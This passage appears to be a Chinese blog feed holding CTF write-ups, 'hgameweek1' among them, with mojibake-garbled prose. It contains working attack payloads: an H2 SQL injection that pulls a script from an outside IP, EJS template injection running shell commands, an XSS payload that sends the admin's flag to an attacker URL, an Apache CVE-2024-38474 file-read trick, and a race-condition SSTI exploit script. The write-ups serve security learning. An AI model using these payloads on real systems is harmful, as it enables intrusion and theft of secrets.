port</code>å¼€å¯æœåŠ¡</p><p>sqlä»€ä¹ˆä¹Ÿæ²¡è¿‡æ»¤ç›´æ¥å†™</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">admin<span class="hljs-string">&#x27; union select 1,&#x27;</span><span class="hljs-number">2</span><span class="hljs-string">&#x27;,&#x27;</span><span class="hljs-number">3</span><span class="hljs-string">&#x27; from link_schema(&#x27;</span>TEST2<span class="hljs-string">&#x27;, &#x27;&#x27;, concat(&#x27;</span>jdbc:h2:mem:testdb1;TRACE_LEVEL_SYSTEM_OUT<span class="hljs-operator">=</span><span class="hljs-number">3</span>;<span class="hljs-keyword">IN</span><span class="hljs-string">&#x27;,&#x27;</span>IT<span class="hljs-operator">=</span>RUNSC<span class="hljs-string">&#x27;,&#x27;</span>RIPT <span class="hljs-keyword">FROM</span> <span class="hljs-string">&#x27;&#x27;</span>http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-number">8.138</span><span class="hljs-number">.181</span><span class="hljs-number">.58</span>:<span class="hljs-number">32771</span><span class="hljs-operator">/</span><span class="hljs-number">1.</span><span class="hljs-keyword">sql</span><span class="hljs-string">&#x27;&#x27;&#x27;), &#x27;</span>sa<span class="hljs-string">&#x27;, &#x27;</span>sa<span class="hljs-string">&#x27;, &#x27;</span>PUBLIC<span class="hljs-string">&#x27;);--</span><br></code></pre></td></tr></table></figure><p>ç™»å½•æ‹¿åˆ°shell</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250210234642888.png" alt="image-20250210234642888"></p><p><code>./readflag</code>æ‹¿åˆ°flag</p><h1 id="display"><a href="#display" class="headerlink" title="display"></a>display</h1><p>ä¸€é“xssä½†æ˜¯CSPé™åˆ¶åªèƒ½åŠ è½½åŒæºè„šæœ¬ï¼Œå¯¹äºå‰ç«¯ä¸æ˜¯å¾ˆäº†è§£ï¼Œåˆ†æä¸æ˜¯å¾ˆé€å½»</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> csp = <span class="hljs-string">&quot;script-src &#x27;self&#x27;; object-src &#x27;none&#x27;; base-uri &#x27;none&#x27;;&quot;</span>;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>æ¯æ—¥ä¸€web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>æ¯”èµ›</tag>
      
      <tag>xss</tag>
      
      <tag>zipä¸Šä¼ </tag>
      
      <tag>linuxè¶Šæƒ</tag>
      
      <tag>CVE-2024-2961</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>hgameweek1</title>
    <link href="/tuyi/2025/02/07/hgameweek1/"/>
    <url>/tuyi/2025/02/07/hgameweek1/</url>
    
    <content type="html"><![CDATA[<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="Pacman"><a href="#Pacman" class="headerlink" title="Pacman"></a><strong>Pacman</strong></h2><p>ä¸€ä¸ªæ˜¯ä¸€é“jsé€†å‘å§ï¼Œæ²¡æ€ä¹ˆå†™æ˜ç™½ï¼Œæ§åˆ¶è°ƒè¯•åä¿®æ”¹åˆ†æ•°å¤§äº10000ç„¶åæŒ‚äº†å°±è¡Œï¼Œ</p><p>ä½†å…¶å®flagå°±åœ¨ä»£ç é‡Œé¢ï¼Œè™½ç„¶æ··æ·†çš„å¾ˆå‰å®³ä½†æ˜¯ä»£ç åˆ©ç”¨3ä¸ªbase4ï¼Œä¸€ä¸ªä¸ªæ˜¯å°±å‡ºæ¥äº†</p><h2 id="BandBomb"><a href="#BandBomb" class="headerlink" title="BandBomb"></a><strong>BandBomb</strong></h2><p>åˆšå¼€å§‹çœ‹åˆ°ä¸»ç•Œé¢çš„å…¨å›æ˜¾ä»¥ä¸ºæœ‰xssï¼Œæµ‹äº†å¾ˆä¹…å‘ç°æ²¡æœ‰</p><p>å‘ç°æ¯æ¬¡è®¿é—®æ ¹è·¯ç”±éƒ½è¦åŠ è½½æ¨¡æ¿æ–‡ä»¶ï¼Œè€Œä¸”åœ¨renameè·¯ç”±åˆæœ‰ä»»æ„æ–‡ä»¶è¦†ç›–é‚£å°±è€ƒè™‘è¦†ç›–æ¨¡æ¿æ–‡ä»¶mortis.ejs</p><p>é¦–å…ˆä¸Šä¼ ä¸€ä¸ªejsæ–‡ä»¶ï¼Œpayload.ejs </p><p>æ–‡ä»¶å†…å®¹ï¼š&lt;%&#x3D; (Function(â€˜return process.mainModule.requireâ€™)())(â€˜child_processâ€™).execSync(â€˜cat &#x2F;proc&#x2F;self&#x2F;environâ€™).toString() %&gt;</p><p>ç„¶åè®¿é—®renameè·¯ç”±å‘é€</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;oldName&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;payload.ejs&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;newName&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;../views/mortis.ejs&quot;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>è®¿é—®ä¸»é¡µå°±èƒ½æ‹¿åˆ°flag</p><h2 id="MysteryMessageBoard"><a href="#MysteryMessageBoard" class="headerlink" title="MysteryMessageBoard"></a><strong>MysteryMessageBoard</strong></h2><p>é¦–å…ˆè¿›æ¥å¼±å£ä»¤çˆ†ç ´å¾—åˆ°å¯†ç 888888</p><p>ç»™äº†æºç </p><p>æœ‰ä¸ªflagè·¯ç”±ï¼Œä½†æ˜¯éœ€è¦adminè®¿é—®æ‰å¯ä»¥</p><p>è®¿é—®adminè·¯ç”±ä¼šè§¦å‘åœ¨åå°è§¦å‘ä¸€ä¸ªæ— å¤´æµè§ˆå™¨ï¼Œç™»å½•adminè´¦å·è€Œä¸”è®¿é—®indexç•Œé¢</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">//æ— å¤´æµè§ˆå™¨æ¨¡æ‹Ÿç™»å½•adminï¼Œå¹¶ä»¥adminèº«ä»½è®¿é—®/è·¯ç”±</span><br><span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br>lock.Lock()<br><span class="hljs-keyword">defer</span> lock.Unlock()<br>ctx, cancel := chromedp.NewContext(context.Background())<br><span class="hljs-keyword">defer</span> cancel()<br>ctx, _ = context.WithTimeout(ctx, <span class="hljs-number">20</span>*time.Second)<br><span class="hljs-keyword">if</span> err := chromedp.Run(ctx, myTasks()); err != <span class="hljs-literal">nil</span> &#123;<br>log.Println(<span class="hljs-string">&quot;Chromedp error:&quot;</span>, err)<br><span class="hljs-keyword">return</span><br>&#125;<br>&#125;()<br>&#125;<br><br><span class="hljs-comment">// æ— å¤´æµè§ˆå™¨æ“ä½œ</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">myTasks</span><span class="hljs-params">()</span></span> chromedp.Tasks &#123;<br><span class="hljs-keyword">return</span> chromedp.Tasks&#123;<br>chromedp.Navigate(<span class="hljs-string">&quot;/login&quot;</span>),<br>chromedp.WaitVisible(<span class="hljs-string">`input[name=&quot;username&quot;]`</span>),<br>chromedp.SendKeys(<span class="hljs-string">`input[name=&quot;username&quot;]`</span>, <span class="hljs-string">&quot;admin&quot;</span>),<br>chromedp.SendKeys(<span class="hljs-string">`input[name=&quot;password&quot;]`</span>, <span class="hljs-string">&quot;fake_password&quot;</span>),<br>chromedp.Click(<span class="hljs-string">`input[type=&quot;submit&quot;]`</span>),<br>chromedp.Navigate(<span class="hljs-string">&quot;/&quot;</span>),<br>chromedp.Sleep(<span class="hljs-number">5</span> * time.Second),<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™æ—¶å€™ä»–æ˜¯adminæƒé™çš„ï¼Œé‚£æˆ‘ä»¬å°±å¯ä»¥xssfetchå¤–å¸¦å‡ºæ¥ï¼Œæ­å»ºä¸€ä¸ªxsså¹³å°ï¼ˆè¿™é‡Œæˆ‘ä½¿ç”¨è‡ªå·±çš„ï¼‰</p><p>åœ¨é¦–é¡µç•™è¨€</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;/flag&#x27;</span>) .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">response</span> =&gt;</span> response.<span class="hljs-title function_">text</span>()) .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">flag</span> =&gt;</span> &#123; <span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;ä½ çš„ç½‘å€?flag=&#x27;</span> + <span class="hljs-built_in">encodeURIComponent</span>(flag)); &#125;); </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>æ‹¿åˆ°flag</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250206155331709.png" alt="image-20250206155331709"></p><h2 id="åŒé¢äººæ´¾å¯¹"><a href="#åŒé¢äººæ´¾å¯¹" class="headerlink" title="åŒé¢äººæ´¾å¯¹"></a><strong>åŒé¢äººæ´¾å¯¹</strong></h2><p>çœ‹ä¸æ‡‚ã€‚ã€‚ã€‚æ¥ä¸ªreå¤§ä½¬å¸¦å¸¦æˆ‘</p><h2 id="è§’è½"><a href="#è§’è½" class="headerlink" title="è§’è½"></a>è§’è½</h2><p>é¦–å…ˆè®¿é—®robots.txt</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-params">User-agent:</span> <span class="hljs-operator">*</span><br><span class="hljs-params">Disallow:</span> <span class="hljs-symbol">/app.conf</span><br><span class="hljs-params">Disallow:</span> <span class="hljs-operator">/</span>app<span class="hljs-comment">/*</span><br></code></pre></td></tr></table></figure><p>fuzzä¸€ä¸‹&#x2F;app&#x2F;å‘ç°ä¸¤ä¸ª</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-regexp">/app/i</span>ndex<br><span class="hljs-regexp">/app/</span><span class="hljs-keyword">read</span><br></code></pre></td></tr></table></figure><p>çœ‹çœ‹<code>/app.conf</code></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># Include by httpd.conf</span><br><span class="hljs-section">&lt;Directory <span class="hljs-string">&quot;/usr/local/apache2/app&quot;</span>&gt;</span><br><span class="hljs-attribute">Options</span> Indexes<br><span class="hljs-attribute">AllowOverride</span> None<br><span class="hljs-attribute">Require</span> <span class="hljs-literal">all</span> granted<br><span class="hljs-section">&lt;/Directory&gt;</span><br><br><span class="hljs-section">&lt;Files <span class="hljs-string">&quot;/usr/local/apache2/app/app.py&quot;</span>&gt;</span><br>    <span class="hljs-attribute">Order</span> <span class="hljs-literal">Allow</span>,<span class="hljs-literal">Deny</span><br>    <span class="hljs-attribute">Deny</span> from <span class="hljs-literal">all</span><br><span class="hljs-section">&lt;/Files&gt;</span><br><br><span class="hljs-attribute">RewriteEngine</span> <span class="hljs-literal">On</span><br><span class="hljs-attribute">RewriteCond</span> <span class="hljs-string">&quot;%&#123;HTTP_USER_AGENT&#125;&quot;</span> <span class="hljs-string">&quot;^L1nk/&quot;</span><br><span class="hljs-attribute">RewriteRule</span> <span class="hljs-string">&quot;^/admin/(.*)$&quot;</span> <span class="hljs-string">&quot;/$1.html?secret=todo&quot;</span><br><br><span class="hljs-attribute">ProxyPass</span> <span class="hljs-string">&quot;/app/&quot;</span> <span class="hljs-string">&quot;http://127.0.0.1:5000/&quot;</span><br></code></pre></td></tr></table></figure><p>å¤§æ¦‚æ„æ€å°±æ˜¯ä»¥&#x2F;usr&#x2F;local&#x2F;apache2&#x2F;appä¸ºæ ¹è·¯å¾„ï¼Œä½†æ˜¯ä¸è®©è®¿é—®app.py</p><p>ä½†æ˜¯å½“**user-agentä¸ºL1nk&#x2F;**å¼€å¤´æ˜¯ä¼šé‡å†™è§„åˆ™æŠŠurlæ”¹å˜,å¸¦UAå¤´å¯ä»¥è¿›è¡Œä»»æ„æ–‡ä»¶è¯»å– æ˜¯<a href="https://www.aqtd.com/nd.jsp?id=6874">CVE-2024-38474</a></p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250211111656036.png" alt="image-20250211111656036"></p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250211112403913.png" alt="image-20250211112403913"></p><p>è®¿é—®&#x2F;admin&#x2F;usr&#x2F;local&#x2F;apache2&#x2F;app&#x2F;app.py%3fï¼Œuser-agentä¸ºL1nk&#x2F;Chromeå¾—åˆ°app.py</p><p>å¸¦ä¸ªï¼Ÿè®©fileå—æ— æ³•åŒ¹é…ï¼ˆ<code>?</code> æ˜¯ä¸€ä¸ªç‰¹æ®Šå­—ç¬¦ï¼Œç”¨äºåˆ†éš”<strong>è·¯å¾„</strong>å’Œ<strong>æŸ¥è¯¢å‚æ•°</strong>ï¼‰</p><p>æºç ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, render_template, render_template_string, redirect<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> templates<br><br>app = Flask(__name__)<br>pwd = os.path.dirname(__file__)<br>show_msg = templates.show_msg<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">readmsg</span>():<br>filename = pwd + <span class="hljs-string">&quot;/tmp/message.txt&quot;</span><br><span class="hljs-keyword">if</span> os.path.exists(filename):<br>f = <span class="hljs-built_in">open</span>(filename, <span class="hljs-string">&#x27;r&#x27;</span>)<br>message = f.read()<br>f.close()<br><span class="hljs-keyword">return</span> message<br><span class="hljs-keyword">else</span>:<br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;No message now.&#x27;</span><br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/index&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>status = request.args.get(<span class="hljs-string">&#x27;status&#x27;</span>)<br><span class="hljs-keyword">if</span> status <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>status = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&quot;index.html&quot;</span>, status=status)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/send&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">write_message</span>():<br>filename = pwd + <span class="hljs-string">&quot;/tmp/message.txt&quot;</span><br>message = request.form[<span class="hljs-string">&#x27;message&#x27;</span>]<br><br>f = <span class="hljs-built_in">open</span>(filename, <span class="hljs-string">&#x27;w&#x27;</span>)<br>f.write(message) <br>f.close()<br><br><span class="hljs-keyword">return</span> redirect(<span class="hljs-string">&#x27;index?status=Send successfully!!&#x27;</span>)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/read&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">read_message</span>():<br><span class="hljs-keyword">if</span> <span class="hljs-string">&quot;&#123;&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> readmsg():<br>show = show_msg.replace(<span class="hljs-string">&quot;&#123;&#123;message&#125;&#125;&quot;</span>, readmsg())<br><span class="hljs-keyword">return</span> render_template_string(show)<br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;waf!!&#x27;</span><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>app.run(host = <span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port = <span class="hljs-number">5000</span>)<br></code></pre></td></tr></table></figure><p>å‘ç°åœ¨é¦–é¡µå†™çš„éƒ½ä¼šå­˜æ”¾åœ¨ä¸´æ—¶æ–‡ä»¶ä¸­ï¼Œå½“æˆ‘ä»¬è®¿é—®readè·¯ç”±æ—¶éƒ½ä¼šè¯»å–æœ€æ–°ä¸€æ¡è¿˜ä¼šæ£€æµ‹å­˜åœ¨<code>&#123;</code>å— ä½†æ˜¯æ–‡ä»¶ä¸€ç›´å¯ä»¥å†™å…¥</p><p>é‚£ä¹ˆæˆ‘ä»¬å¤§é‡çš„å†™å…¥åŒæ—¶å¤§é‡è®¿é—®ç†è®ºä¸Šå¯ä»¥åœ¨æ‰§è¡Œread_messageï¼ˆï¼‰çš„ifåˆ¤æ–­æ—¶æ˜¯æ­£å¸¸çš„ä¿¡æ¯ï¼Œè€Œåœ¨æ¸²æŸ“æ—¶æ˜¯sstiä»£ç å°±å¯ä»¥æ‹¿åˆ°shell</p><p>è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> threading<br><span class="hljs-keyword">import</span> time<br><br>TARGET = <span class="hljs-string">&quot;http://node1.hgame.vidar.club:30288/app&quot;</span><br><br>MALICIOUS_PAYLOAD = <span class="hljs-string">&quot;&#123;&#123;lipsum.__globals__[&#x27;os&#x27;].popen(&#x27;cat /flag&#x27;).read()&#125;&#125;&quot;</span><br><br>session = requests.Session()<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">set_benign</span>():<br>    url = <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;TARGET&#125;</span>/send&quot;</span><br>    data = &#123;<span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;benign&quot;</span>&#125;<br>    <span class="hljs-keyword">try</span>:<br>        r = session.post(url, data=data, timeout=<span class="hljs-number">10</span>)<br>        <span class="hljs-keyword">return</span> r.status_code<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;set_benign error:&quot;</span>, e)<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">set_malicious</span>():<br>    url = <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;TARGET&#125;</span>/send&quot;</span><br>    data = &#123;<span class="hljs-string">&quot;message&quot;</span>: MALICIOUS_PAYLOAD&#125;<br>    <span class="hljs-keyword">try</span>:<br>        r = session.post(url, data=data, timeout=<span class="hljs-number">10</span>)<br>        <span class="hljs-keyword">return</span> r.status_code<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;set_malicious error:&quot;</span>, e)<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">trigger_read</span>():<br>    url = <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;TARGET&#125;</span>/read&quot;</span><br>    <span class="hljs-keyword">try</span>:<br>        r = session.get(url, timeout=<span class="hljs-number">10</span>)<br>        <span class="hljs-keyword">return</span> r.text<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;trigger_read error:&quot;</span>, e)<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">attempt</span>():<br>    set_benign()<br><br>    t = threading.Timer(<span class="hljs-number">0.01</span>, set_malicious)<br>    t.start()<br><br>    time.sleep(<span class="hljs-number">0.005</span>)<br><br>    result = trigger_read()<br>    <span class="hljs-keyword">return</span> result<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;å¼€å§‹å°è¯•è§¦å‘æ¡ä»¶ç«äº‰æ¼æ´ä»¥è·å¾— flag ...&quot;</span>)<br>    attempt_count = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        attempt_count += <span class="hljs-number">1</span><br>        result = attempt()<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;hgame&#123;&quot;</span> <span class="hljs-keyword">in</span> result:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;å¯èƒ½æˆåŠŸè·å¾— flagï¼š&quot;</span>)<br>            <span class="hljs-built_in">print</span>(result)<br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">if</span> attempt_count % <span class="hljs-number">10</span> == <span class="hljs-number">0</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;å°è¯•æ¬¡æ•°ï¼š<span class="hljs-subst">&#123;attempt_count&#125;</span>, æœ€è¿‘è¿”å›å†…å®¹ï¼ˆå‰100å­—ç¬¦ï¼‰ï¼š<span class="hljs-subst">&#123;result[:<span class="hljs-number">100</span>]&#125;</span>&quot;</span>)<br>        time.sleep(<span class="hljs-number">0.1</span>)<br></code></pre></td></tr></table></figure><h1 id="re"><a href="#re" class="headerlink" title="re"></a>re</h1><h2 id="Compress-dot-new"><a href="#Compress-dot-new" class="headerlink" title="Compress dot new"></a><strong>Compress dot new</strong></h2><p>dsç›´æ¥å—–äº†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> json<br><br><span class="hljs-comment"># è¯»å–enc.txtæ–‡ä»¶</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;enc.txt&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    content = f.read().split(<span class="hljs-string">&#x27;\n&#x27;</span>, <span class="hljs-number">1</span>)<br>    json_tree = content[<span class="hljs-number">0</span>]<br>    encoded_bits = content[<span class="hljs-number">1</span>].strip()<br><br><span class="hljs-comment"># è§£æJSONæ ‘ç»“æ„</span><br>huffman_tree = json.loads(json_tree)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decode_huffman</span>(<span class="hljs-params">tree, bit_str</span>):<br>    result = []<br>    current_node = tree<br>    <span class="hljs-keyword">for</span> bit <span class="hljs-keyword">in</span> bit_str:<br>        <span class="hljs-keyword">if</span> bit == <span class="hljs-string">&#x27;0&#x27;</span>:<br>            current_node = current_node[<span class="hljs-string">&#x27;a&#x27;</span>]<br>        <span class="hljs-keyword">else</span>:<br>            current_node = current_node[<span class="hljs-string">&#x27;b&#x27;</span>]<br><br>        <span class="hljs-comment"># æ£€æŸ¥æ˜¯å¦ä¸ºå¶å­èŠ‚ç‚¹</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;s&#x27;</span> <span class="hljs-keyword">in</span> current_node:<br>            char_code = current_node[<span class="hljs-string">&#x27;s&#x27;</span>]<br>            result.append(char_code)<br>            current_node = tree  <span class="hljs-comment"># é‡ç½®åˆ°æ ¹èŠ‚ç‚¹</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>(result)<br><br><br><span class="hljs-comment"># è§£ç å¹¶è¾“å‡ºç»“æœ</span><br>decoded_bytes = decode_huffman(huffman_tree, encoded_bits)<br><span class="hljs-built_in">print</span>(decoded_bytes.decode(<span class="hljs-string">&#x27;latin-1&#x27;</span>))<br></code></pre></td></tr></table></figure><p><strong>flag: hgame{Nu-Shell-scr1pts-ar3-1nt3r3st1ng-t0-wr1te-&amp;-use!}</strong></p>]]></content>
    
    
    <categories>
      
      <category>æ¯æ—¥ä¸€web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>æ¯”èµ›</tag>
      
      <tag>xss</tag>
      
      <tag>æ¡ä»¶ç«äº‰</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ååºåˆ—åŒ–ä¹‹å­—ç¬¦ä¸²é€ƒé€¸</title>
    <link href="/tuyi/2025/02/05/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/"/>
    <url>/tuyi/2025/02/05/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/</url>
    
